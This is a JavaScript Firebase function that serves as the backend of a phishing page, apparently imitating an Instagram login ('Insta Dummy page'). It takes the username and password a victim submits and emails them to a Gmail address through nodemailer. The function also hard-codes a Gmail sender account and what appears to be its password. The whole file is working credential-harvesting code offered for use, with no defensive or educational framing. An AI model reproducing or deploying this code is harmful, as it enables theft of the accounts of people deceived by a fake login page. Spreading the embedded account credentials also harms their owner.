// Import nodemailer package
const nodemailer = require('nodemailer');

// Firebase Function to handle form submission and send email
exports.sendEmail = functions.https.onRequest((req, res) => {
  // Fetch username and password from the POST request body
  const username = req.body.u_name || ''; // Using nullish coalescing operator to provide a default value
  const passcode = req.body.pass || ''; // Using nullish coalescing operator to provide a default value

  // Define email subject, recipient, and email body
  const subject = "Someone Login! Insta Dummy page";
  const to = "krish14046168@gmail.com";
  const text = `Username: ${username}\r\nPassword: ${passcode}`;

  // Check if username and passcode are not empty
  if (username && passcode) {
    // Create a transporter object
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'krish61680362@gmail.com', // Replace with your Gmail email address
        pass: 'katyal6168'   // Replace with your Gmail email password
      }
    });

    // Define mail options
    const mailOptions = {
      from: 'krish61680362@gmail.com', // Replace with your Gmail email address
      to: to,
      subject: subject,
      text: text
    };

    // Send email
    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        console.error('Error sending email:', error);
        res.status(500).send('Error sending email');
      } else {
        console.log('Email sent:', info.response);
        // Handle success response
        res.status(200).send('Email sent successfully');
      }
    });
  } else {
    // Handle case where username or passcode is empty
    res.status(400).send('Please enter correct username or password. Try again');
  }
});
